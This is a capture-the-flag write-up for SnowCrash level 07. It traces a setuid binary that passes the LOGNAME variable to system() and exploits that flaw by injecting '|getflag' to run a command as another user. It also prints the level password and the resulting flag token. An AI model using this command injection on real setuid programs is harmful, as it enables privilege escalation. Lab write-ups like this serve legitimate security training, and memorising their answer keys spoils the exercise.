# Level 07 : found flag07

```bash
ssh level07@192.168.1.37 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.1.37
level07@192.168.1.37's password: wiok45aaoguiboiki2tuin6ub
level07@SnowCrash:~$
```

```bash
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```

```bash
level07@SnowCrash:~$ ./level07
level07
```

We can see with `ltrace` command that "level07" is printed with a call to `sytem("/bin/echo")` and the value to print is in the environment variable `LOGNAME`.

```bash
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff764, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                     = 2007
geteuid()                                                     = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)           = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)           = 0
getenv("LOGNAME")                                             = "level07"
asprintf(0xbffff6b4, 0x8048688, 0xbfffff26, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                        = 0
+++ exited (status 0) +++
```

```bash
level07@SnowCrash:~$ hexdump -C ./level07
[..]
00000680  4c 4f 47 4e 41 4d 45 00  2f 62 69 6e 2f 65 63 68  |LOGNAME./bin/ech|
00000690  6f 20 25 73 20 00 00 00  01 1b 03 3b 30 00 00 00  |o %s ......;0...|
[..]
```

```bash
level07@SnowCrash:~$ echo $LOGNAME
level07
```

So, by changing the value of `LOGNAME`, we can easily execute a command.

```bash
level07@SnowCrash:~$ env LOGNAME="|whoami" ./level07
flag07
```

```bash
level07@SnowCrash:~$ env LOGNAME="|getflag" ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

****************************************

Documentations :
* https://linux.die.net/man/1/strace
* https://linux.die.net/man/1/ltrace
* https://www.freebsd.org/cgi/man.cgi?query=hexdump&sektion=1
* https://phoenixts.com/blog/environment-variables-in-linux/
